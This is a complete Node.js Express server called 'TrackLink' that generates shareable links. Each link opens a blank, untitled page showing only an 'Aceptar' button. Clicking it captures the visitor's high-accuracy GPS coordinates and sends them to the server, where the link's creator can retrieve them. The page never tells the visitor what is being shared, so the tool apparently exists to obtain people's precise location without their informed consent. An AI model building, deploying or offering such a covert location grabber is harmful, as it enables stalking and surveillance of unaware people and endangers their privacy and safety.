import express from "express";
import cors from "cors";
import crypto from "crypto";

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: "1mb" }));

const requests = new Map();

/* =========================
   INICIO
========================= */

app.get("/", (req, res) => {
  res.json({
    ok: true,
    app: "TrackLink",
    status: "online",
    version: "3.2"
  });
});

/* =========================
   HEALTH
========================= */

app.get("/health", (req, res) => {
  res.json({
    ok: true,
    status: "online",
    app: "TrackLink",
    version: "3.2"
  });
});

/* =========================
   CREAR ENLACE
========================= */

app.post("/api/tracklink/create", (req, res) => {

  const id = crypto.randomBytes(12).toString("hex");

  requests.set(id, {
    id,
    status: "waiting",
    createdAt: new Date().toISOString(),
    data: null
  });

  const baseUrl =
    `${req.protocol}://${req.get("host")}`;

  const link =
    `${baseUrl}/share/${id}`;

  res.json({
    ok: true,
    id,
    link
  });
});

/* =========================
   PÁGINA DEL ENLACE
   SOLO BOTÓN ACEPTAR
========================= */

app.get("/share/:id", (req, res) => {

  const id = req.params.id;

  if (!requests.has(id)) {

    return res.status(404).send(`
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title></title>
</head>
<body>
</body>
</html>
`);
  }

  res.type("html").send(`
<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,initial-scale=1">

<title></title>

<style>

html,
body {

  margin: 0;

  width: 100%;

  height: 100%;

  background: #ffffff;

}

body {

  display: flex;

  align-items: center;

  justify-content: center;

}

button {

  border: 0;

  border-radius: 12px;

  padding: 16px 45px;

  background: #111111;

  color: #ffffff;

  font-size: 16px;

  font-weight: bold;

  cursor: pointer;

}

button:disabled {

  opacity: .5;

}

</style>

</head>

<body>

<button id="accept">
Aceptar
</button>

<script>

const button =
document.getElementById("accept");

button.addEventListener(
"click",
function () {

  if (!navigator.geolocation) {
    return;
  }

  button.disabled = true;

  navigator.geolocation.getCurrentPosition(

    async function(position) {

      const data = {

        latitude:
          position.coords.latitude,

        longitude:
          position.coords.longitude,

        accuracy:
          position.coords.accuracy

      };

      try {

        const response =
          await fetch(
            "/api/tracklink/submit/${id}",
            {
              method: "POST",

              headers: {
                "Content-Type":
                  "application/json"
              },

              body:
                JSON.stringify(data)
            }
          );

        if (!response.ok) {
          button.disabled = false;
        }

      } catch (error) {

        console.error(error);

        button.disabled = false;

      }

    },

    function(error) {

      console.error(error);

      button.disabled = false;

    },

    {

      enableHighAccuracy: true,

      timeout: 15000,

      maximumAge: 0

    }

  );

});

</script>

</body>

</html>
`);
});

/* =========================
   RECIBIR UBICACIÓN
========================= */

app.post("/api/tracklink/submit/:id", (req, res) => {

  const request =
    requests.get(req.params.id);

  if (!request) {

    return res.status(404).json({
      ok: false,
      error: "Solicitud no encontrada."
    });

  }

  const {
    latitude,
    longitude,
    accuracy
  } = req.body;

  if (
    typeof latitude !== "number" ||
    typeof longitude !== "number"
  ) {

    return res.status(400).json({
      ok: false,
      error: "Ubicación inválida."
    });

  }

  request.status = "received";

  request.data = {

    latitude,

    longitude,

    accuracy:
      typeof accuracy === "number"
        ? accuracy
        : null,

    receivedAt:
      new Date().toISOString()

  };

  requests.set(
    req.params.id,
    request
  );

  console.log(
    "📍 Ubicación recibida:",
    req.params.id
  );

  res.json({
    ok: true
  });

});

/* =========================
   RESULTADO
========================= */

app.get("/api/tracklink/result/:id", (req, res) => {

  const request =
    requests.get(req.params.id);

  if (!request) {

    return res.status(404).json({
      ok: false,
      error: "Solicitud no encontrada."
    });

  }

  res.json({

    ok: true,

    id:
      request.id,

    status:
      request.status,

    createdAt:
      request.createdAt,

    data:
      request.data

  });

});

/* =========================
   SERVIDOR
========================= */

app.listen(
  PORT,
  "0.0.0.0",
  () => {

    console.log(
      "🟢 TRACKLINK INICIADO"
    );

    console.log(
      "🌐 Puerto:",
      PORT
    );

  }
);
